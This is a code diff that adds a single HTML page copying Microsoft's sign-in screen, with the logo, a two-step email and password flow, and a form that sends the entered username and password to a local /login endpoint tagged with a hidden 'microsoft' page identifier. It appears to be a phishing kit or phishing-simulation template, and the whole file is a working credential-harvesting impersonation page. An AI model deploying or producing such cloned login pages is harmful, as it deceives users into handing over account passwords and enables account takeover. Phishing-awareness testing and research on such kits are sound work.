@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in to your account</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      padding: 44px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 2px 6px rgba(0,0,0,.12);
+    }
+
+    .logo {
+      margin-bottom: 16px;
+    }
+
+    .logo svg {
+      width: 108px;
+      height: 24px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin-bottom: 12px;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      color: #1b1b1b;
+      margin-bottom: 24px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #1b1b1b;
+      margin-bottom: 4px;
+    }
+
+    input[type="email"],
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 6px 0;
+      font-size: 15px;
+      border: none;
+      border-bottom: 1px solid #666;
+      outline: none;
+      background: transparent;
+      color: #1b1b1b;
+      transition: border-color 0.15s;
+    }
+
+    input:focus {
+      border-bottom: 2px solid #0067b8;
+    }
+
+    .btn-next,
+    .btn-signin {
+      display: block;
+      width: 100%;
+      padding: 8px 16px;
+      background: #0067b8;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      margin-top: 24px;
+      text-align: center;
+      transition: background 0.15s;
+    }
+
+    .btn-next:hover,
+    .btn-signin:hover {
+      background: #005a9e;
+    }
+
+    .options {
+      margin-top: 16px;
+      font-size: 13px;
+    }
+
+    .options a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+
+    .options a:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      border: none;
+      border-top: 1px solid #e6e6e6;
+      margin: 24px 0;
+    }
+
+    .create-account {
+      font-size: 13px;
+      color: #1b1b1b;
+    }
+
+    .create-account a {
+      color: #0067b8;
+      text-decoration: none;
+    }
+
+    .footer {
+      margin-top: 32px;
+      font-size: 12px;
+      color: #666;
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .footer a {
+      color: #666;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    #password-section {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <!-- Microsoft wordmark SVG -->
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24" fill="none">
+        <path d="M0 0h11.429v11.429H0z" fill="#F35325"/>
+        <path d="M12.571 0H24v11.429H12.571z" fill="#81BC06"/>
+        <path d="M0 12.571h11.429V24H0z" fill="#05A6F0"/>
+        <path d="M12.571 12.571H24V24H12.571z" fill="#FFBA08"/>
+        <path d="M35.39 6.26h-3.96L28.5 16.56h-.06l-3-10.3H21.6l4.56 13.44h2.82L35.39 6.26z" fill="#737373"/>
+        <path d="M35.84 19.7h2.76V6.26h-2.76V19.7z" fill="#737373"/>
+        <path d="M37.22 4.62a1.7 1.7 0 100-3.4 1.7 1.7 0 000 3.4z" fill="#737373"/>
+        <path d="M46.58 17.6c-2.1 0-3.6-1.68-3.6-4.62s1.5-4.62 3.6-4.62c2.1 0 3.6 1.68 3.6 4.62s-1.5 4.62-3.6 4.62zm0 2.4c3.72 0 6.42-2.64 6.42-7.02s-2.7-7.02-6.42-7.02c-3.72 0-6.42 2.64-6.42 7.02s2.7 7.02 6.42 7.02z" fill="#737373"/>
+        <path d="M53.9 6.26v13.44h2.7v-7.26c0-2.1 1.26-3.42 3.12-3.42 1.68 0 2.7 1.08 2.7 2.88v7.8h2.76V11.3c0-3.12-1.8-5.34-4.98-5.34-1.74 0-3.12.78-3.9 2.1h-.06V6.26H53.9z" fill="#737373"/>
+        <path d="M70.52 17.78c-1.38 0-2.34-.72-2.34-1.8 0-1.14.96-1.86 2.76-1.86h2.82v1.02c0 1.62-1.38 2.64-3.24 2.64zm-.6 2.22c1.62 0 3-.66 3.84-1.8h.06v1.5h2.64V11.3c0-3.18-1.98-5.34-5.52-5.34-2.94 0-5.04 1.5-5.52 3.78l2.64.42c.3-1.2 1.26-1.92 2.76-1.92 1.68 0 2.76.96 2.76 2.46v.54h-3.06c-3.18 0-5.16 1.62-5.16 4.14 0 2.34 1.74 3.66 4.56 3.66z" fill="#737373"/>
+        <path d="M84.56 8.54c1.8 0 3.06 1.44 3.18 3.54H81.2c.24-2.16 1.56-3.54 3.36-3.54zm5.82 5.7H81.14c.18 2.22 1.56 3.54 3.54 3.54 1.38 0 2.52-.6 3.12-1.74l2.46.9c-.96 2.04-3 3.06-5.58 3.06-3.72 0-6.3-2.58-6.3-7.02 0-4.32 2.52-7.02 6.18-7.02 3.6 0 5.82 2.52 5.82 6.6v.66z" fill="#737373"/>
+        <path d="M91.4 6.26v13.44h2.7v-7.26c0-2.1 1.26-3.42 3.12-3.42 1.68 0 2.7 1.08 2.7 2.88v7.8h2.76V11.3c0-3.12-1.8-5.34-4.98-5.34-1.74 0-3.12.78-3.9 2.1h-.06V6.26H91.4z" fill="#737373"/>
+      </svg>
+    </div>
+
+    <h1>Sign in</h1>
+    <p class="subtitle">to continue to Microsoft</p>
+
+    <form id="login-form" method="POST" action="/login">
+      <input type="hidden" name="page_id" value="microsoft" />
+
+      <div id="email-section">
+        <div class="form-group">
+          <label for="email">Email, phone, or Skype</label>
+          <input type="email" id="email" name="username" autocomplete="username" autofocus required />
+        </div>
+        <div class="options">
+          <a href="#">No account? Create one!</a>
+        </div>
+        <div class="options" style="margin-top:8px">
+          <a href="#">Can't access your account?</a>
+        </div>
+        <button type="button" class="btn-next" onclick="showPassword()">Next</button>
+      </div>
+
+      <div id="password-section">
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" autocomplete="current-password" required />
+        </div>
+        <div class="options">
+          <a href="#">Forgot password?</a>
+        </div>
+        <button type="submit" class="btn-signin">Sign in</button>
+      </div>
+    </form>
+
+    <hr class="divider" />
+
+    <div class="create-account">
+      <a href="#">Sign-in options</a>
+    </div>
+
+    <div class="footer">
+      <a href="#">Terms of use</a>
+      <a href="#">Privacy &amp; cookies</a>
+      <a href="#">...</a>
+    </div>
+  </div>
+
+  <script>
+    function showPassword() {
+      const emailVal = document.getElementById("email").value.trim();
+      if (!emailVal) {
+        document.getElementById("email").focus();
+        return;
+      }
+      document.getElementById("email-section").style.display = "none";
+      document.getElementById("password-section").style.display = "block";
+      document.getElementById("password").focus();
+    }
+  </script>
+</body>
+</html>
